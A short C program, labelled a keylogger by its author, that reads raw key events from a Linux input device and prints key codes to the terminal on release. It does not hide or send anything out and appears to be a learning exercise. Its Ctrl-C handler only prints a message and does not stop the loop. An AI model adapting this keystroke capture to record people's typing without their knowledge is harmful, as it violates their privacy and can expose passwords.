
// written by the finest Amankwah Rawley

// keylogger, only valid for numbers 1 to 9
// useful paths /usr/include/linux/input.h
// useful path /usr/include/linux/input-event-codes.h


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <signal.h>


#define ARGCOUNT 2

#define EV_RELEASED 0
#define EV_PRESSED 1
#define EV_REPEAT 2


void sigint_handler(int sig){
	(void) sig;
	write(STDOUT_FILENO, "\n^C caught, stopping program\n", 29);
}


int main(int argc, char **argv){

	if(argc != ARGCOUNT){
		fprintf(stderr, "Usage: %s <device_path>\n", argv[0]);
		exit(EXIT_FAILURE);	
	}

	char *device_path = argv[1];
		
	int fd = open(device_path, O_RDONLY);
	if(fd == -1){
		fprintf(stderr, "Could not open device path\n");
		exit(EXIT_FAILURE);
	}

	//printf("The keyboard code is: %d\n", KEY_B);

	struct sigaction sa;
	sa.sa_handler = sigint_handler;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;

	if(sigaction(SIGINT, &sa, NULL) == -1){
		perror("sigaction");
		exit(EXIT_FAILURE);
	}

	struct input_event event;
	event.type = EV_KEY;
	//event.value = EV_PRESSED;
	//event.code = KEY_B;

	//ssize_t i= 0;
	while(1){
		ssize_t byte_read = read(fd, &event, sizeof(struct input_event));
		if(byte_read < 1 || byte_read != sizeof(struct input_event)){
			//fprintf(stderr, "Error encountered\n Exiting...");
			perror("Byte read error");
			exit(EXIT_FAILURE);
		}

		// if(event.type == EV_KEY && event.value == EV_PRESSED){
		// 	printf("Event code is: %d\n", event.code);
		// }

		if(event.type ==EV_KEY && event.value == EV_RELEASED){
			printf("scan code: %d\n", event.code-1);
		}

	}
	//write(STDOUT_FILENO, &event, sizeof(struct input_event));


	if(close(fd) == -1){
		perror("Error closing device file");
		exit(EXIT_FAILURE);
	}

	printf("Program exiting successfully...\n");
	
	exit(EXIT_SUCCESS);
}
